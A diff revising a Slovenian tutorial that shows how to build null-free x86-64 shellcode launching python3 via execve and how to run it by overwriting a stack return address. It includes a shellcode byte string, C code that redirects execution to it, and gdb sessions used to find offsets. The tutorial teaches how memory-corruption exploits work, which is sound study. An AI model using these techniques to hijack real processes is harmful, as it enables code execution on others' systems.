@@ -40,7 +40,7 @@ V splošnem poženemo program takole `program file1 -d rw 1` in ob zagonu ima pr
 
 Napišemo kratek program v programskem jeziku C, ki bo pognal ukazno lupino programskega jezika `python`. Ker želimo slediti splošnemu izvajanju programov, izberemo funkcijo `execve` za zagon drugega programa iz programa samega:
 
-    int execve(char const *path, char const *argv[], char const *envp[]);
+`int execve(char const *path, char const *argv[], char const *envp[]);`
 
     nano program.c
 
@@ -200,7 +200,7 @@ Najprej natančneje ugotovimo kje se nahaja vrnitveni naslov, zato v naš progra
     gcc program.S -o program
     ./program
 
-Ker bo naš program predstavljen kot niz, le ta ne sme vsebovati nobene ničle, saj splošne funkcije za branje nizov pričakujejo v programskem jeziku C pričakujejo posebni končni znak na koncu niza, da vedo kdaj morajo prenehati z branjem. In ta posebni končni znak vsebuje ničlo (`\0`). Zato nadomestimo vse ukaze, ki direktno zapisujejo ničle v registre z logično operacijo XOR. V primeru, ko zapisujemo vrednost 59 v register `rax` pa tega ne moremo uporabiti, zato register najprej nastavimo na nič, tako da uporabimo logično operacijo XOR in nato zapišemo vrednost 59 le v spodnji bajt registra, saj se pri tem pri prevajanju ne dodajo ničle pred vrednostjo 59 do polne dolžine registra.
+Ker bo naš program predstavljen kot niz, le ta ne sme vsebovati nobene ničle, saj splošne funkcije za branje nizov pričakujejo v programskem jeziku C pričakujejo posebni končni znak na koncu niza, da vedo kdaj morajo prenehati z branjem. In ta posebni končni znak vsebuje ničlo (`\0`). Zato nadomestimo vse ukaze, ki direktno zapisujejo ničle v registre z logično operacijo XOR. V primeru, ko zapisujemo vrednost 59 v register `rax` pa tega ne moremo uporabiti, zato register najprej nastavimo na nič, tako da uporabimo logično operacijo XOR in nato zapišemo vrednost 59 le v spodnji bajt registra (spodnjih 8 bit registra `rax` lahko dostopamo preko registra `al`), saj se pri tem pri prevajanju ne dodajo ničle pred vrednostjo 59 do polne dolžine registra.
 
     nano program.S
 
@@ -292,6 +292,8 @@ Torej imamo program, ki ga lahko podamo kot niz drugemu programu, ki bo pognal n
     run
 
     break main
+
+    run
 
     s
 
@@ -487,15 +489,17 @@ Sedaj uporabimo razhroščevalnik `gdb`, da lahko določimo konstanti `X` in `Y`
 
     End of assembler dump.
 
-    $3 = (void *) 0x7fffffffebc8 
+    (gdb) p $rsp+8 
+
+    $2 = (void *) 0x7fffffffebc8 
 
     (gdb) p &a 
 
-    $4 = (int *) 0x7fffffffebac 
+    $3 = (int *) 0x7fffffffebac 
 
     (gdb) p (unsigned long)($rsp + 8) - (unsigned long)&a 
 
-    $5 = 28
+    $4 = 28
 
 Sedaj popravimo vrstico `#define X 28` in prevedemo kodo ter preverimo ali spremenljivka `f` vsebuje vrnitveni naslov `0x5555555551a3`, ki kaže na ukaz `cltq`.
 
@@ -539,7 +543,7 @@ V naši kodi torej spremenljivka `f` sedaj hrani naslov v pomnilniku kjer se nah
 
     $2 = 20 
 
-Naslov ukaza, ki kaže na začetek klica funkcije `callme` lahko ugotovimo tudi tako, da spremenljivko `Y` nastavimo na 0 in z `gdb` izvajamo naš program z ukazom `s` in se ustavimo, ko pridemo do vrstice `c = c + e;` in nato izpišemo kodo programa z ukazom `disassemble` in pogledam na kateri naslov kaže puščica trenutnega ukaza.
+Naslov ukaza, ki kaže na začetek klica funkcije `printf` lahko ugotovimo tudi tako, da spremenljivko `Y` nastavimo na 0 in z `gdb` izvajamo naš program z ukazom `s` in se ustavimo, ko pridemo do vrstice printf("c: %d\n", c); in nato izpišemo programsko kodo funkcije `main` z ukazom `disassemble` in pogledam na kateri naslov kaže puščica trenutnega ukaza.
 
     nano stacky.c
 
@@ -719,7 +723,7 @@ Vrstico `f = (unsigned long*)(((char*)&a) + X);` lahko poenostavimo tako, da nam
 
     c: 5
 
-Sedaj pa bomo podali še naš začetni program kot niz program `stacky.c`. Niz pridobimo tako, da program izpišemo v zbirniku z orodjem `gdb` in ga izpišemo kot niz od vključno ukaza `xor    %rsi,%rsi` do vključno z vrstico za ukazom `call`.
+Sedaj pa bomo podali še naš začetni program kot niz program `stacky.c`. Niz pridobimo tako, da program izpišemo v zbirniku z orodjem `gdb` in ga izpišemo kot niz od vključno ukaza `jmp    0x114e <main+41>` do vključno z vrstico za ukazom `call`.
 
     gcc program.S -g -o program
 
@@ -793,13 +797,13 @@ Niz našega programa `\353\016_H1\366H1\322H1\300\260;\017\005\350\355\377\377\3
 
     #include <stdio.h>
 
-    #define Y 20
+    #define X 7
 
     int callme(int a, unsigned long *b){
         unsigned long *f;
         char program[64] = "\353\016_H1\366H1\322H1\300\260;\017\005\350\355\377\377\377/usr/bin/python3";
         f = (unsigned long*)(&a + X);	// Override return address.
-        *f = (unsigned long)&(program[0])
+        *f = (unsigned long)&(program[0]);
         return a + *b;
     }
 
